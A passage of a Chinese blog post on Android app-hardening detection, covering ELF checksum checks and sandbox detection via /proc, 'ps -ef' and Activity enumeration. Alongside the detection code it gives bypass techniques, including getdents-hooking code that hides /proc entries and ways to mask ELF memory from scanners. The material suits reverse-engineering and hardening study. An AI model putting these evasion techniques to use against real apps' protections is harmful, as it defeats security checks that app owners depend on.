LOG(INFO) &lt;&lt; &quot;get elf section error &quot; &lt;&lt; filePath;</span><br><span class="line">        my_close(fd);</span><br><span class="line">        return section;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    //记录个数</span><br><span class="line">    section.execSectionCount = execSectionCount;</span><br><span class="line"> </span><br><span class="line">    section.startAddrinMem = 0;</span><br><span class="line">    for (int i = 0; i &lt; execSectionCount; i++) &#123;</span><br><span class="line">        my_lseek(fd, (off_t) offset[i], SEEK_SET);</span><br><span class="line">        //void * buffer = alloca(memSize[i] * sizeof(uint8_t));</span><br><span class="line">        //存放text或者plt全部的数据内容,大约5-10M大小,为了兼容小内存手机。</span><br><span class="line">        //所以放在堆里面,而不是栈,防止小内存手机栈指针溢出。</span><br><span class="line">        auto buffer = (void *) calloc(1, memSize[i] * sizeof(uint8_t));</span><br><span class="line">        if (buffer == nullptr) &#123;</span><br><span class="line">            free(buffer);</span><br><span class="line">            return section;</span><br><span class="line">        &#125;</span><br><span class="line">        my_read(fd, buffer, memSize[i]);</span><br><span class="line">        section.offset[i] = offset[i];</span><br><span class="line">        section.memsize[i] = memSize[i];</span><br><span class="line">        section.checksum[i] = checksum(buffer, memSize[i]);</span><br><span class="line"> </span><br><span class="line">//        LOGE(&quot;fetch_checksum_of_library %s ExecSection:[%d][%ld][%ld][%ld]&quot;,</span><br><span class="line">//             filePath, i, offset[i], memSize[i], section-&gt;checksum[i])</span><br><span class="line">        free(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    section.isSuccess = true;</span><br><span class="line">    my_close(fd);</span><br><span class="line">    return section;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后和本地的指令去计算 。计算本地的指令方法就是对maps进行遍历，只遍历text和plt段 ，计算累加值和本地进行判断 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 检测问的check sum</span><br><span class="line"> * 检测到check未修改返回0</span><br><span class="line"> * 检测已修改返回1</span><br><span class="line"> * 检测失败返回-1</span><br><span class="line"> */</span><br><span class="line">int detect_elf_checksum(const char *soPath, execSection *pSection) &#123;</span><br><span class="line">    if (pSection == nullptr) &#123;</span><br><span class="line">        LOGI(&quot;detect_elf_checksum execSection == null  &quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    char map[MAX_LINE];</span><br><span class="line">    const char *maps_path = string(&quot;proc/&quot;).append(to_string(getpid())).append(&quot;/maps&quot;).c_str();</span><br><span class="line"> </span><br><span class="line">    int fd = my_openat(AT_FDCWD, maps_path, O_RDONLY, 0);</span><br><span class="line"> </span><br><span class="line">    if (fd &lt;= 0) &#123;</span><br><span class="line">        LOGE(&quot;detect_elf_checksum open %s fail &quot;, PROC_MAPS);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    int checkSum = 0;</span><br><span class="line">    while ((read_one_line(fd, map, MAX_LINE)) &gt; 0) &#123;</span><br><span class="line">        if (my_strstr(map, soPath) != nullptr) &#123;</span><br><span class="line">            checkSum = scan_executable_segments(map, pSection, soPath);</span><br><span class="line">            if (checkSum == 1) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    my_close(fd);</span><br><span class="line">    return checkSum;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * 检测问的check sum</span><br><span class="line"> * 检测到check未修改返回0</span><br><span class="line"> * 检测已修改返回1</span><br><span class="line"> * 检测失败返回-1</span><br><span class="line"> */</span><br><span class="line">int scan_executable_segments(</span><br><span class="line">        char *mapItem,</span><br><span class="line">        execSection *pElfSectArr,</span><br><span class="line">        const char *libraryName) &#123;</span><br><span class="line">    unsigned long start, end;</span><br><span class="line">    char buf[MAX_LINE] = &quot;&quot;;</span><br><span class="line">    char path[MAX_LENGTH] = &quot;&quot;;</span><br><span class="line">    char tmp[100] = &quot;&quot;;</span><br><span class="line"> </span><br><span class="line">    sscanf(mapItem, &quot;%lx-%lx %s %s %s %s %s&quot;, &amp;start, &amp;end, buf, tmp, tmp, tmp, path);</span><br><span class="line"> </span><br><span class="line">    if (buf[2] == &#x27;x&#x27;) &#123;</span><br><span class="line">        if (buf[0] == &#x27;r&#x27;) &#123;</span><br><span class="line">            uint8_t *buffer;</span><br><span class="line"> </span><br><span class="line">            buffer = (uint8_t *) start;</span><br><span class="line">            for (int i = 0; i &lt; pElfSectArr-&gt;execSectionCount; i++) &#123;</span><br><span class="line">                if (start + pElfSectArr-&gt;offset[i] + pElfSectArr-&gt;memsize[i] &gt; end) &#123;</span><br><span class="line">                    if (pElfSectArr-&gt;startAddrinMem != 0) &#123;</span><br><span class="line">                        buffer = (uint8_t *) pElfSectArr-&gt;startAddrinMem;</span><br><span class="line">                        pElfSectArr-&gt;startAddrinMem = 0;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i = 0; i &lt; pElfSectArr-&gt;execSectionCount; i++) &#123;</span><br><span class="line">                auto begin = (void *) (buffer + pElfSectArr-&gt;offset[i]);</span><br><span class="line">                unsigned long size = pElfSectArr-&gt;memsize[i];</span><br><span class="line">                LOGI(&quot;%s [%p] size -&gt;[%lu]&quot;, libraryName, begin, size);</span><br><span class="line">                //MPROTECT((size_t)begin, size, MEMORY_R);</span><br><span class="line">                unsigned long output = checksum(begin, size);</span><br><span class="line">                LOGI(&quot;%s checksum:[%ld][%ld]&quot;, libraryName, output, pElfSectArr-&gt;checksum[i])</span><br><span class="line">                if (output != pElfSectArr-&gt;checksum[i]) &#123;</span><br><span class="line">                    //和本地的So Checksum 对不上</span><br><span class="line">                    return 1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (buf[0] == &#x27;r&#x27;) &#123;</span><br><span class="line">            pElfSectArr-&gt;startAddrinMem = start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这块就一定是比较完善的检测方案了么？其实有很多对抗思路 。比如把maps里面的内存进行隐藏，变成匿名内存，这样他在扫描maps的就找不到，对应的比如上面说的libc的item</p><p>这块可以参考riru里面的 map_hide ，代码路径如下 </p><p><a href="https://github.com/RikkaApps/Riru/blob/master/riru/src/main/cpp/hide_utils.cpp">https://github.com/RikkaApps/Riru/blob/master/riru/src/main/cpp/hide_utils.cpp</a></p><p>当然这种方式一定是安全的么？</p><blockquote><p>其实，不是的，因为在他的这个代码里面我发现存在一个遗漏点，可以作为检测入手点 ，某个加固厂商，不仅仅会对<code>maps item</code>进行遍历 ，还会对里面的匿名内存进行遍历 ，检测匿名内存里面的 <code>magic</code> ，比如<code>so</code> 文件的<code>magic</code>是<code>elf</code> ，如果<code>magic</code> 匹配上一样当<code>maps</code>去解析 去遍历。</p><p>所以可以在原有的基础上改改，在将内存变成匿名内存以后，<strong>把elf的前四个字节抹掉</strong>，也就是magic的 内容，抹掉以后记得把权限修改成和之前的一样 。防止内存检测 。</p></blockquote><h3 id="检测沙箱"><a href="#检测沙箱" class="headerlink" title="检测沙箱"></a>检测沙箱</h3><p>这块检测核心逻辑全部放在<code>ISO</code>线程检测 。可以配置一个服务，然后服务里使用如下变量即可 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;service</span><br><span class="line">    android:name=&quot;.ZhenxiServer&quot;</span><br><span class="line">    android:isolatedProcess=&quot;true&quot;</span><br><span class="line">    android:useAppZygote=&quot;true&quot;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure><p>这块有人可能会问什么是iso线程？<strong>可以理解成一个独立的安全的线程</strong>，只能通过和外部IPC交互的方式进行通讯 。useAppZygote 相当于让这个进程运行在Zygote中 。<strong>这个时候时机特别早</strong>，早到什么程度呢？就<strong>连libart.so 都没加载</strong>，所以这个检测进程只能调用一些原始的libc方法，不能调用任何Art相关的函数 。</p><p>下面也是主要介绍一下<code>hunter</code>的检测思路 。</p><h4 id="检测多余线程PID"><a href="#检测多余线程PID" class="headerlink" title="检测多余线程PID:"></a>检测多余线程PID:</h4><p>主要实现思路就是去检测proc下面是否有除了main进程以外的其他pid ,因为正常启动的话，肯定是只有一个main进程 。</p><p>但是沙箱的话会在启动之前去启动别的进程 ，所以这块可以进行bypass 。后面我会统一说这块应该如何对抗 ，包括如何绕过</p><p>这块先介绍检测思路 ，和检测原理 。这块里面有一个<code>replaceSecInsns</code>是封装的一个函数，我担心 <code>opendir</code> 被<code>Hook</code>了，所以每次执行都去把指令替换成</p><p>本地文件的指令，而不是去执行内存里面的指令 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">auto orig_opendir = reinterpret_cast&lt;DIR *(*)</span><br><span class="line">            (const char *)&gt;(replaceSecInsns(getlibcPath(), &quot;opendir&quot;));</span><br><span class="line">    DIR *pdr = orig_opendir(&quot;/proc&quot;);</span><br><span class="line">    if (pdr == nullptr) &#123;</span><br><span class="line">        return getItemData(env, &quot;程序出错请放弃修改后重试&quot;,</span><br><span class="line">                           nullptr, true, RISK_LEAVE_DEADLY, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    auto orig_ator = reinterpret_cast&lt;struct dirent *(*)(DIR *)&gt;</span><br><span class="line">    (replaceSecInsns(getlibcPath(), &quot;readdir&quot;));</span><br><span class="line">    dirent *read_ptr;</span><br><span class="line">    //在app启动之前检测当前app所有的进程,判断是否存在和main不一样的进程</span><br><span class="line">    while ((read_ptr = orig_ator(pdr)) != nullptr) &#123;</span><br><span class="line">        long procPid = strtol(read_ptr-&gt;d_name, nullptr, 10);</span><br><span class="line">        //LOG(INFO) &lt;&lt; &quot;find /proc/ child dir  &quot; &lt;&lt; procPid;</span><br><span class="line">        //打开成功&amp;&amp;发现一条不等于主进程id的pid</span><br><span class="line">        if (procPid &amp;&amp; procPid != getpid()) &#123;</span><br><span class="line">            auto title = string(&quot;检测到APK存在沙箱内部&quot;);</span><br><span class="line">            char buff[200];</span><br><span class="line">            getNameByPid((pid_t) procPid, buff);</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt;  FIND OTHER THREAD SANDBOX &quot; &lt;&lt; procPid &lt;&lt; &quot;  &quot; &lt;&lt; buff;</span><br><span class="line">            auto &amp;data =</span><br><span class="line">                    string(&quot;当前线程主进程PID(&quot;).append(to_string(getpid())).append(&quot;)&quot;).append(&quot;\n&quot;).</span><br><span class="line">                            append(&quot;异常pid -&gt; &quot;).append(to_string(procPid)).</span><br><span class="line">                            append(&quot;(&quot;).append(&quot;pid name: &quot;).append(buff).append(&quot;)&quot;);</span><br><span class="line">            //可能存在多个异常pid而非一个</span><br><span class="line">            getItemData(env, title, data.c_str(), false, RISK_LEAVE_WARN, TAG_SANDBOX);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(pdr);</span><br></pre></td></tr></table></figure><h5 id="对抗："><a href="#对抗：" class="headerlink" title="对抗："></a>对抗：</h5><p>这块想要绕过也很简单，<code>opendir</code> 底层其实就是 <code>getdents64，getdents</code> 如果遇到你想隐藏的文件直接对文件进行<code>bypass</code>就可以了，直接指向下一个指针</p><p>代码来自<code>proot</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">        case SC_getdents64:</span><br><span class="line">        case SC_getdents: &#123;</span><br><span class="line">            /* get the result of the syscall, which is the number of bytes read by getdents</span><br><span class="line">             * 获取系统调用的结果，即getdents读取的字节数</span><br><span class="line">             * */</span><br><span class="line">            unsigned int res = peek_reg(tracee, CURRENT, SYSARG_RESULT);</span><br><span class="line">            if (res &lt;= 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            /* get the system call arguments */</span><br><span class="line">            word_t orig_start = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">            unsigned int count = peek_reg(tracee, CURRENT, SYSARG_3);</span><br><span class="line">            char orig[count];</span><br><span class="line"> </span><br><span class="line">            char path[PATH_MAX];</span><br><span class="line">            int status = readlink_proc_pid_fd(tracee-&gt;pid,</span><br><span class="line">                                              (int) peek_reg(tracee, ORIGINAL, SYSARG_1), path);</span><br><span class="line">            if (status &lt; 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            //不属于绑定路径则不处理,这块应该加个判断。如果这个path没有处理的路径应该返回 。</span><br><span class="line">            //目前需要处理的只有proc,用于隐藏调试线程。</span><br><span class="line">//            if(!belongs_to_guestfs(tracee, path))</span><br><span class="line">//                return 0;</span><br><span class="line">            if (!StringUtils::containsInsensitive(path,&quot;proc&quot;))&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            /* retrieve the data from getdents</span><br><span class="line">             * 从getdents检索数据</span><br><span class="line">             * */</span><br><span class="line">            status = read_data(tracee, orig, orig_start, res);</span><br><span class="line">            if (status &lt; 0) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            /* allocate a space for the copy of the data we want</span><br><span class="line">             * 为我们想要的数据的副本分配一个空间</span><br><span class="line">             * */</span><br><span class="line">            char copy[count];</span><br><span class="line">            /* curr will hold the current struct we&#x27;re examining</span><br><span class="line">             * curr将保存我们正在检查的当前结构</span><br><span class="line">             * */</span><br><span class="line">            struct linux_dirent64 *curr64;</span><br><span class="line">            struct linux_dirent *curr32;</span><br><span class="line">            /* pos keeps track of where in memory the copy is</span><br><span class="line">             * pos跟踪副本在内存中的位置</span><br><span class="line">             * */</span><br><span class="line">            char *pos = copy;</span><br><span class="line">            /* ptr keeps track of where in memory the original is</span><br><span class="line">             * ptr跟踪原始文件在内存中的位置</span><br><span class="line">             * */</span><br><span class="line">            char *ptr = orig;</span><br><span class="line">            /* nleft keeps track of how many bytes we&#x27;ve saved</span><br><span class="line">             * nleft跟踪我们保存了多少字节</span><br><span class="line">             * */</span><br><span class="line">            unsigned int nleft = 0;</span><br><span class="line"> </span><br><span class="line">            /* while we&#x27;re still within the memory allowed</span><br><span class="line">             * 当我们还在允许的memory范围内时</span><br><span class="line">             * */</span><br><span class="line">            if (get_sysnum(tracee, ORIGINAL) == SC_getdents64) &#123;</span><br><span class="line">                while (ptr &lt; orig + res) &#123;</span><br><span class="line"> </span><br><span class="line">                    /* get the current struct</span><br><span class="line">                     * 获取当前结构</span><br><span class="line">                     * */</span><br><span class="line">                    curr64 = (struct linux_dirent64 *) ptr;</span><br><span class="line"> </span><br><span class="line">                    /* if the name does not matche a given prefix</span><br><span class="line">                     * 如果名称与给定前缀不匹配</span><br><span class="line">                     *</span><br><span class="line">                     * 如果这个目录项的名称不以HIDDEN_PREFIX开始，</span><br><span class="line">                     * 也就是hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)返回false，</span><br><span class="line">                     * 那么这个目录项会被保留在结果中，否则，这个目录项会被忽略，也就是隐藏。</span><br><span class="line">                     * */</span><br><span class="line">                    //if (!hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)) &#123;</span><br><span class="line">                    if (!isRuntimeHideDir(tracee-&gt;pid,curr64-&gt;d_name, tracer_pc(tracee), tracer_lr(tracee))) &#123;</span><br><span class="line">                        /* copy the information</span><br><span class="line">                         * 复制信息</span><br><span class="line">                         * */</span><br><span class="line">                        mybcopy(ptr, pos, curr64-&gt;d_reclen);</span><br><span class="line"> </span><br><span class="line">                        /* move the pos and nleft */</span><br><span class="line">                        pos += curr64-&gt;d_reclen;</span><br><span class="line">                        nleft += curr64-&gt;d_reclen;</span><br><span class="line">                    &#125;</span><br><span class="line">                    /* move to the next linux_dirent</span><br><span class="line">                     * 隐藏这个目录,指向下一个文件</span><br><span class="line">                     * */</span><br><span class="line">                    ptr += curr64-&gt;d_reclen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                while (ptr &lt; orig + res) &#123;</span><br><span class="line"> </span><br><span class="line">                    /* get the current struct */</span><br><span class="line">                    curr32 = (struct linux_dirent *) ptr;</span><br><span class="line"> </span><br><span class="line">                    /* if the name does not matche a given prefix */</span><br><span class="line">//                    if (!hasprefix(HIDDEN_PREFIX, curr64-&gt;d_name)) &#123;</span><br><span class="line">                    if (!isRuntimeHideDir(tracee-&gt;pid,curr32-&gt;d_name, tracer_pc(tracee), tracer_lr(tracee))) &#123;</span><br><span class="line"> </span><br><span class="line">                        /* copy the information */</span><br><span class="line">                        mybcopy(ptr, pos, curr32-&gt;d_reclen);</span><br><span class="line"> </span><br><span class="line">                        /* move the pos and nleft */</span><br><span class="line">                        pos += curr32-&gt;d_reclen;</span><br><span class="line">                        nleft += curr32-&gt;d_reclen;</span><br><span class="line">                    &#125;</span><br><span class="line">                    /* move to the next linux_dirent */</span><br><span class="line">                    ptr += curr32-&gt;d_reclen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            /* If there is nothing left</span><br><span class="line">             * 这个文件夹里面本身没有东西,暂不处理</span><br><span class="line">             * */</span><br><span class="line">            if (!nleft) &#123;</span><br><span class="line">//                /* call getdents again */</span><br><span class="line">//                if (get_sysnum(tracee, ORIGINAL) == PR_getdents64)</span><br><span class="line">//                    register_chained_syscall(tracee, PR_getdents64, peek_reg(tracee, ORIGINAL, SYSARG_1), orig_start, count, 0, 0, 0);</span><br><span class="line">//                else</span><br><span class="line">//                    register_chained_syscall(tracee, PR_getdents, peek_reg(tracee, ORIGINAL, SYSARG_1), orig_start, count, 0, 0, 0);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /* copy the data back into the register */</span><br><span class="line">                status = write_data(tracee, orig_start, copy, nleft);</span><br><span class="line">                if (status &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                /* update the return value to match the data */</span><br><span class="line">                poke_reg(tracee, SYSARG_RESULT, nleft);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="执行ps命令："><a href="#执行ps命令：" class="headerlink" title="执行ps命令："></a>执行ps命令：</h4><p>这块的思路就是<strong>检测是否存在其他进程</strong> ，通过执行<code>ps -ef</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">if (get_sdk_level() &gt; ANDROID_Q) &#123;</span><br><span class="line">    //check process</span><br><span class="line">    auto orig_popen = reinterpret_cast&lt;FILE *(*)(const char *,</span><br><span class="line">                                                 const char *)&gt;(replaceSecInsns(getlibcPath(),</span><br><span class="line">                                                                                &quot;popen&quot;));</span><br><span class="line">    FILE *file = orig_popen(&quot;ps -ef&quot;, &quot;r&quot;);</span><br><span class="line">    if (file == nullptr) &#123;</span><br><span class="line">        return getItemData(env, &quot;程序出错请放弃修改后重试&quot;,</span><br><span class="line">                           &quot;ps error&quot;, true, 3, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    char buf[0x1000];</span><br><span class="line">    string buffStr;</span><br><span class="line">    uint size = 0;</span><br><span class="line">    // get process count size</span><br><span class="line">    while (fgets(buf, sizeof(buf), file)) &#123;</span><br><span class="line">        buffStr.append(buf).append(&quot;\n&quot;);</span><br><span class="line">        //不包含++</span><br><span class="line">        if(!StringUtils::contains(buf,&quot;hunter&quot;))&#123;</span><br><span class="line">            size++;</span><br><span class="line">            LOG(INFO) &lt;&lt; &quot;ps -ef match -&gt; %s &quot; &lt;&lt; buf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (size &gt; 2) &#123;</span><br><span class="line">        //UID             PID   PPID C STIME TTY          TIME CMD</span><br><span class="line">        //u0_a531        6187    885 72 10:27:53 ?    00:00:00 com.zhenxi.hunter</span><br><span class="line">        //u0_a531        6236   6187 0 10:27:53 ?     00:00:00 ps -ef</span><br><span class="line">        pclose(file);</span><br><span class="line"> </span><br><span class="line">        return getItemData(env, &quot;检测到APK存在沙箱内部(异常线程)&quot;,</span><br><span class="line">                           buffStr.c_str(), false, RISK_LEAVE_DEADLY, TAG_SANDBOX);</span><br><span class="line">    &#125;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;&gt;&gt;&gt;&gt;&gt; NOT FIND SANDBOX &quot;;</span><br><span class="line">    pclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="对抗：-1"><a href="#对抗：-1" class="headerlink" title="对抗："></a>对抗：</h5><p>可以先伪造一个正常的文件，在执行到 ps -ef的时候把命令换成cat 你自己的文件 即可 。</p><h4 id="内存Choose"><a href="#内存Choose" class="headerlink" title="内存Choose:"></a>内存Choose:</h4><p>这块的实现思路就是，检测内存里面的 Activity 或者 Application的个数 。正常我们的apk启动只会有我们自己的</p><p>Application，沙箱因为预启动的关系，会存在其他的Application ，这块也是一个很好的检测思路 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static ListItemBean checkSandbox() &#123;</span><br><span class="line">    ArrayList&lt;Object&gt; choose;</span><br><span class="line">    try &#123;</span><br><span class="line">        choose = ChooseUtils.choose(Activity.class, true);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    if (choose != null) &#123;</span><br><span class="line">        ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        //移除我们的Activity,把其他的activity实例加到List里面</span><br><span class="line">        for(Object activty:choose)&#123;</span><br><span class="line">            String name = activty.getClass().getName();</span><br><span class="line">            if(!name.equals(MainActivity.class.getName())&amp;&amp;</span><br><span class="line">                    !name.equals(ShareActivity.class.getName())&amp;&amp;</span><br><span class="line">                        !name.equals(FeedbackActivity.class.getName())</span><br><span class="line">                )&#123;</span><br><span class="line">                list.add(activty);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //判断list数量是否大于1</span><br><span class="line">        if (list.size() &gt;= 1) &#123;</span><br><span class="line">            ListItemBean item = new ListItemBean(</span><br><span class="line">                    &quot;检测到APK存在沙箱内部&quot;,</span><br><span class="line">                    ListItemBean.RiskLeave.Deadly);</span><br><span class="line">            for (Object obj : list) &#123;</span><br><span class="line">                item.putData(obj.getClass().getName());</span><br><span class="line">            